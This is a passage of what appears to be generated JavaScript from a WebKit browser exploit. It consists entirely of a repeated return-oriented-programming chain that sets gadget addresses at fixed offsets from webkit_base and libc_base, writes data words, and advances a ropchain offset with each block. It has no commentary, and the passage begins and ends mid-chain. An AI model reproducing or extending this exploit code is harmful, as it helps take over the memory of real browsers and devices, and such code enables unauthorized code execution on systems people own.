webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263208, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263280, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263352, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263424, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263496, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263568, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263640, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263712, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263784, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263856, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263928, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264000, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264072, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264144, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264216, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264288, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264360, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264432, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264504, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264576, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264648, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264720, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264792, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264864, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264936, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265008, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265080, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265152, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265224, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265296, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265368, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265440, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265512, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265584, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265656, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265728, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265800, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265872, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265944, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266016, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266088, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266160, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266232, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266304, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266376, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266448, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266520, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266592, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266664, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266736, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266808, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266880, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266952, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267024, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267096, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267168, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267240, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267312, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267384, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267456, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267528, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267600, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267672, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267744, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267816, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267888, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267960, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268032, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268104, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268176, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268248, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268320, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268392, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268464, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268536, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268608, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268680, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268752, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268824, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268896, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268968, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269040, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269112, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269184, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269256, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269328, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269400, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269472, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269544, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269616, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269688, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269760, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269832, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269904, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269976, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270048, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270120, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270192, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270264, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270336, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270408, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270480, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270552, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270624, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270696, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270768, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270840, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270912, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270984, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271056, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271128, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271200, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271272, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271344, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271416, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271488, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271560, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271632, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271704, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271776, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271848, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271920, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271992, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272064, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272136, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272208, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272280, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272352, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272424, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272496, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272568, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272640, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272712, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272784, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272856, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272928, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
